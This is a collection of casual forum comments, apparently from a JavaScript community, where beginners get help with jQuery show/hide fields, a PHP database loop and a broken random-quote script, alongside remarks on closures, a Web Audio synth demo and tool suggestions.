Are you looking for something like [this](http://plnkr.co/edit/1q62UF?p=preview)?
Not if you increment everything. $increment=0; while(){ $increment++; $('#firstinput_&lt;?=$increment?&gt;') $('#secondinput_&lt;?=$increment?&gt;') $('#thirdinput_&lt;?=$increment?&gt;') } I don't know what these fields correspond to, but hopefully you would name them better. With the jquery method, you just need to generalize it a bit more. The onclick will work, though.
Wow! This is amazing and is going to help me learn javascript so much. Just one more questions, I also want to allow the user to hide box 3 just like he is able to show box 3, is this complicated? EDIT: ok I went over it again and have another 'problem' if you don't mind helping, I want to have all the fields with actual predetermined results. What I was doing was querying the database and then displaying it with a while() loop, how do I query the database (which I query using the current session ID of the browser) So if (3) were to have the text of $row['textbox3'] and each (3) would have a different text from the last, how do I do this?
[So I updated it to do what I think you wanted.](http://plnkr.co/edit/1q62UF?p=preview) It can be modified and cleaned up a bit. I am not sure what your asking for with the php query though. Is it possible to reword it better? perhaps someone else will know what you mean. I am using jquery to do it. I am not sure your level of experience with javascript is based on reading what you have posted here. But it wont work unless you include jquery into your project. You can see in the code I sent you I am using the google hosted library to include javascript onto the page. You could also do the same.
No, that's pretty straightforward jQuery... I take it you're new to Javascript then? Programming in general maybe? jQuery is a library for event handling... and a lot of stuff... it's nothing tricky. The for looping scoping thing is tricky. Here, added a button to hide the third input: http://jsfiddle.net/kC4UW/2/ If you are new to programming, and want to understand it instead of just copy-pasting code all the time, I highly recommend working through [The Structure and Interpretation of Computer Programs](http://mitpress.mit.edu/sicp/). It uses Scheme, which is actually quite similar to Javascript, once you get past the different syntax.
Yes to both your questions. Been working on learning html/css/php these past couple months but only starting on JS. I will definitely check out that link right now Your edited code wasn't exactly what I was looking for in terms of hiding it, but it's alright you still gave me a lot to learn from and i'll figure it out, thanks!
My knowledge of javascript is very very basic but yes I did include jquery to my project. Let me try and explain better what I want to do I have a database table with the following fields text1, text2, text3 (the naming is obviously not that, just doing it to simplify it) Right now, I have a small php script that grabs an x amount (i haven't really decided what x will be yet, but that's irrelevant) of results, and then displays it like this while($row=$stmt-&gt;fetch()) { echo "&lt;div id='1'&gt;"; echo $row['text1']; echo $row['text2']; echo "&lt;/div&gt; &lt;div id='3'&gt;"; echo #row['text'3]; echo "&lt;/div&gt;"; } How do I sort of 'combine' these, where as in your code you have a set text ("textbox1 was clicked") for text3, but I want it to be grabbed from the database
It's a mysql database, check out my response to yaegerbomb for a more indepth description of what I want to do please!
This is pretty awesome. 
Brilliant.
ahh okay. Couple things. Are you looking to have the text inserted into the third text box the same value no matter what previous text field is clicked? If that is the case you should just be able to in your php do an echo like: echo "&lt;input value="$row[3]"&gt;&lt;/input&gt;" that will set the value of the input without using any kind of javascript. If you want it to grab something based on what is clicked you may have to do an ajax call in javascript and use jquery to populate the input field. If I am following you correctly. The way my example was set up is that the third input field is hidden until the user clicks the first two. So it really wouldnt matter if it was populated before hand or not (unless it was for security purposes).
Sorry, I just realized i've been saying text field when I 'literally' meant... a field with text in it.. haha. What i'll be displaying will be exactly this if when querying my database I got these results $subject=$row['subject']; $info=$row['info']; $more=$row['more']; &lt;div&gt;&lt;h1&gt;$subject- $info&lt;/h1&gt;&lt;/div&gt; &lt;div&gt;$more&lt;/div&gt; and yeah there will be classes, it's just an example. So yeah, the data will already be loaded as the page loads so no values will be changed. I apologize for quite literally sucking at explaining myself, but i'm a coding newbie and haven't learned all the terms yet. I appreciate you continuing to help me
Most modern browsers have a JavaScript console, so you probably already have it (Firefox have a "ScratchPad" in Tools -&gt; Web Developer). Depending on what you're doing, you can write a simple HTML page with `&lt;script&gt;`. Or, if you want something more complex, there is [Node.js](http://nodejs.org/).
Never thought to do this, but it actually illustrates the stack quite nicely. Good find! 
... I did :(
I love the idea ... Will fork shortly
[This graph is meaningless](http://rhysbrettbowen.github.io/how_google_does_it/#/5/2). [Label your axis](http://imgs.xkcd.com/comics/convincing.png)!
Line thirteen and fourteen, you should be using an equality sign, the ===. AnyVariable = AnyValue will always be true. 
Awesome; it worked. Thanks for the help!
You're welcome! :D
With closures, there is no need for the OO paradigm. And so without OO, the "this problem" doesn't exist. When I first started using Javascript, I too used an OO paradigm. But, with closures, you can get everything you can get in OO. (BTW, I haven't used inheritance in OO for over 15 years - use composition + interface) A smart programmer I worked with once said, "OO is a poor man's closure". I never fully understood this until I worked with a language that supported closures. Now my code isn't littered with binds and latent missing bind bugs.
Thanks I've looked for one of these a few years ago and most of the solutions were pretty poor. I ended up settling on [mooTree](https://sites.google.com/a/mindplay.dk/mootree/). It might be helpful to look at the callbacks they set up. If I remember correctly I needed to be able to block drop requests gracefully, expand / collapse tree nodes.
Just to let everyone know, the second part of this post is now out: [http://codingcookies.com/2013/04/07/building-a-roguelike-in-javascript-part-3b/](http://codingcookies.com/2013/04/07/building-a-roguelike-in-javascript-part-3b/)
Seriously, has no one mentioned Node JS (http://nodejs.org). This will allow you to write Javascript in a text editor like Notepad++ and then execute it in the console. They have a lot of prebuilt functionality too through the NPM registry (instructions on the Node website).
vididearth sorted you out... but FYI, it would be much more efficient to do this in css!
This post doesn't have any information we could use to help you. 
The JavaScript is not meant to show up in the browser only the HTML (styled by the CSS) is meant to. You may want to post some code snippets, where is your SO question?
http://codepen.io/ http://jsfiddle.net/ http://jsbin.com/ Take your pick and post your code. 
This is from 1998, so it's a little out of fashion, but it explains the concept I would guess you're missing, which is the &lt;script&gt; tag in your HTML: http://cs.brown.edu/courses/bridge/1998/res/javascript/javascript-tutorial.html#2 In addition to having &lt;script&gt;code here&lt;/script&gt;, you can also include a JS file using the &lt;script&gt; tag. When you have the script tag working correctly, you should see it in your HTML source in your browser, and you should be able to open the JS file if you're linking to one.
Can the people get a flipping DEMO button somewhere? Like, you know, at the top all bright and shiny. Pisses me off to no end. How do I know if I want to learn your tutorial unless I play the shit for like 5 seconds right up front. I mean, IT IS, a web game right? Let's play it.
If you're willing to work on Chrome, this might REALLY help you: http://discover-devtools.codeschool.com/ Shameless plug: /r/LearnJavaScript
&gt; AnyVariable = AnyValue will always be true. Uh, no.. assignment evaluates to whatever value is being assigned. For example x = 0 evaluates to 0 and would be falsey.
&lt;?xml version="1.0" encoding= "UTF -8:?&gt; &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11 /DTD/xhtml11.dtd"&gt; &lt;html xmlns=http://www.w3.org/1999/xhtml: xml:lang="en"&gt; &lt;head&gt; &lt;title&gt;Quotable Quotes&lt;/title&gt; &lt;script type="text/javascript"&gt; &lt;!-- Hide the script form old browsers function getQuote() { // Create the arrays quotes = new Arrays (4); sources = new Arrays (4); // Initialize the arrays with quotes quotes[0] = "When I was a boy of 14, my father was so " + "ignorant...but when I got to be 21, I was astonished " + "at how much he had learned in 7 years."; sources[0] = "Mark Twain"; quotes[1] = "Everybody is ignorant. Only on different " + "subjects."; sources[1] = "Will Rogers"; quotes[2] = "They say such nice things about people at " + "their funerals that it makes me sad that I'm going to " + "miss mine by just a few days."; sources[2] = "Garrison Keilor"; quotes[3] = "What's another word for thesaurus?"; sources[3] = "Steven Wright"; // Get a random index into the arrays i = Math.floor(Math.random() * quotes.length); // Write out the quote as HTML document.write("&lt;dl style='background-color: lightpink'&gt;\n"); document.write("&lt;dt&gt;" + "\"&lt;em&gt;" + quotes[i] + "&lt;/em&gt;\"\n"); document.write("&lt;dd&gt;" + "- " + sources[i] + "\n"); document.write("&lt;dl&gt;\n"); } // Stop hiding the script --&gt; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Quotable Quotes&lt;/h1&gt; &lt;p&gt;Following is a random quotable quote. To see a new quote just reload this page.&lt;/p&gt; &lt;script type="text/javascript"&gt; &lt;!-- Hide the script from old browsers getQuote(); // Stop hiding the script --&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;
Oops, I'm so sorry. I forgot. It has been updated. Thank you.
Thank you. I will check the subreddit out. I'm sure it will be very, very helpful.
Would recommend WebStorm instead of Notepad++: http://www.jetbrains.com/webstorm/ I'm not affiliated with them, just a big fan.
That's just it. I don't want to create two empty arrays, but a value of "4". This is code line by line from a book... I'm not certain what went wrong.
stackoverflow.com is a great resource.
So are you saying that it's not supposed to be "==="?
Then use `new Array(4)` without the *s* to create an array of length 4. JavaScript automatically extends your arrays as needed, however, so `[]` works too.
Here is what I came up with :) 
You don't really need to comment out script for old browsers. This was a workaround to older versions of Netscape that would just output the contents of the script tag. This was an issue 15 years ago -- no longer today. Although, with XHTML these days, you might have reserved characters in your script like -- &lt;, &gt; or &amp; -- which will break the correctness of the XML document --you may need to enclose in CDATA sections, ala : &lt;![CDATA[ javascript here ]]&gt; Or, the better way without adding cruft to the markup is to create a separate JS file and reference it like so, &lt;script type="text/javascript" src="yourfile.js"&gt;&lt;/script&gt; This likely won't help you with the problem with your script -- but hey, the more you know. ~~Try placing the script tag above the end &lt;/body&gt;. When you document.write() you are really outputting html at that point in the document -- so this script is adding &lt;dl&gt; and &lt;dt/dd&gt; in the head of the document~~ (***Edit** - I misread that. There is a "getQuote" function call that appears above the end of &lt;/body&gt; so this is valid -- still probably not a good idea to use document.write too much though :D*) and, fun fact, if a document.write is performed after the document has finished loading (i.e. in an onload routine) it will completely zap the contents of your page. Best to avoid document.write. Finally, it's "Array()" not "Arrays()". Also you can also write this shorthand like, var quotes = ["quote1", "quote2", "quote3"]; And actually, I think the brower is having such a hard time with this is the first line, your xml declaration is all messed up -- there's a colon in there ... also the opening html tag is malformed. Use this : &lt;?xml version="1.0" encoding="utf-8" ?&gt; &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
I was taught C# so once I remembered that all coding languages are essentially the same it came together much quicker. Thank you so much for the effort you put into your answer! I'm glad you had some fun
Freaking brilliant! I found a gap though. It doesn't seem to support variable hoisting. If I have code in a function that references a variable from the parent scope that's declared after the function, it doesn't get coloured correctly.
If it were me: function getQuote() { // - You don't need to give an initial size to the array, just make a new one. // - ALWAYS preface your variables with 'var', otherwise they will be treated as global variables. This // will become clear if you call functions within other functions. it can mess up loop logic // quite spectacularly var quotes = []; // - Array.push() will add the parameter to the next available array slot, in this case - index 0 // - Bear with me through this bit! - If you can follow my logic, I think the end result will be much // more clean and understandable. // What I did was 'combine' the two arrays by creating a plain object ( this thing -&gt; { } ) with two // properties: 'text', and 'source' // This allows you to keep all of your data directly related to the quotes in ONE place, and to call // it all you need to do is call: quotes[i].text or quotes[2].source etc quotes.push( { text : "When I was a boy of 14, my father was so ignorant...but when I got to be 21, I was astonished at how much he had learned in 7 years." , source : "Mark Twain" } ); // Essentially the same thing, except here I illustrate that you can still hard-set an array index to // your new plain object. quotes[1] = { text : "Everybody is ignorant. Only on different subjects.", source : "Will Rogers" }; // Again, the same thing is achieved. This time, instead of using multi-line strings // with "string1" + "string2", we can just add '\' to the end of the line to signal that the string will // continue to the next line. // Much nicer in my personal opinion quotes.push( { text : "They say such nice things about people \ at their funerals that it makes me sad that I'm going to \ miss mine by just a few days.", source : "Garrison Keilor" } ); // Lastly, the same thing, only formatted in the most common way you'll see it done. quotes.push( { text : "What's another word for thesaurus?", source : "Steven Wright" } ); // Get a random index into the arrays var i = Math.floor( Math.random() * quotes.length ); // Write out the quote as HTML document.write("&lt;dl style='background-color: lightpink'&gt;\n"); // Here, to call our 'quote', we simply call the array index and get its 'text' property document.write("&lt;dt&gt;" + "\"&lt;em&gt;" + quotes[i].text+ "&lt;/em&gt;\"\n"); // Same thing, but with the 'source' property. Now we don't need two arrays for one set of information :) document.write("&lt;dd&gt;" + "- " + quotes[i].source + "\n"); document.write("&lt;dl&gt;\n"); // The actual HTML is a tad outdated. For example it's generally better to style a &lt;span&gt; // than use &lt;em&gt;, but you can toss that to the back of your head for now, it's just a little note // for the future. } I realize that this makes quite a few changes to the original, but I do believe if you can follow the logic, it will instill better habits sooner. Essentially the changes are: * Plain Objects instead of two separate Arrays for a single, related set of information. * use Array.push() unless you need to hard-set an index for some reason (overwriting an old value, deleting an entry) * Use the backslash (\\) to signify a multi-line string instead of "string1" + "string2", purely for readability and purely my personal opinion. Plain objects are the shit, and one of the many reasons I have more fun writing in scripting languages like JavaScript than OOPs like Java. If any of this doesn't make sense, or if you have any more questions, please feel free to ask. Hope it helps :) 
Looks a bit crappy in Chrome: http://i.imgur.com/nBxgbam.png
Along with some of the other instructions here, drop the XHTML junk. Teach yourself HTML5 if you are just learning. It's a bit simpler: &lt;!-- drop the xml header --&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;!-- rest of your code--&gt;
I am humbled... Thank you for taking the time to help me. I wish I had something to offer in return my friend. I'm not entirely "good" at anything, but I will be sure to study harder and pay your hospitality forward.
I have posted it to stackoverflow.com, but I think it was a bit rudimentary of a problem. But I thank you for a help
Thank you very much!
Github for anyone interested - https://github.com/stuartmemo/sympathetic-synth/
You've put a smile on my face for the rest of the day. Good enough for me!
Rick Dangerous intermission: K Y F K Y F K Y F KK OO Cool stuff, I am waiting for a simple sequencer featuring separate tracks and saving tune made with that :)
I can't find the unminified source for tsw.js, and my searches get clogged up with some game called The Secret World. I'm trying to find the direct interaction with the Web Audio API--could you point me in the right direction? 
Groovy 
You're absolutely right, that was incredibly forgetful on my part! I've updated all the posts in the series to have a demo link and will make sure to include one with each post in the future. Sorry about that! Thanks for letting me know though, I appreciate it.
This is incredible. Wish I could plug my midi keyboard in to have a play with it properly.
Thanks for this write-up. Interesting.
Maybe soon. There is a MIDI API in the works at Google.
You didn't capitalize the 'L' in addListener
Thanks :) Here's a crappy JS game I made for your enjoyment: http://jasonfrinchaboy.com/spacemaze/ Try to get all the space gold while re-upping your oxygen before it runs out. Also, you must get the colored keys to unlock certain walls. Arrow keys move. One hard level is all I got, not even sure if its possible to complete ;)
The more we reduce server-side computation, the better. 
Usually, there's no need to download: every modern browser understands JS once referenced correctly inside a page. But if you don't want the browser's DOM, there are server-side engines like node.js or rhino, too. If you don't want the server, but only the pure language, you can download V8 without a browser, but don't expect to be able to do much with that. Yes, you assume correctly that you'll edit it inside a text editor: Sublime Text is very good, but notepad++ isn't too bad either.
Reminds me a lot of [Nukemap](http://nuclearsecrecy.com/nukemap/)
Very nice. Not sure if bug or not, click &amp; drag off the keyboard. then hover over keys for insta-spam.
Nice! A few months ago i wrote a jquery plugin that makes canvas based knobs. I'll fork and contrib another UI if I ever find the time. [demo](http://josh.isgrowing.net/jCircle.html) [github](https://github.com/jhaglund/jCircle) 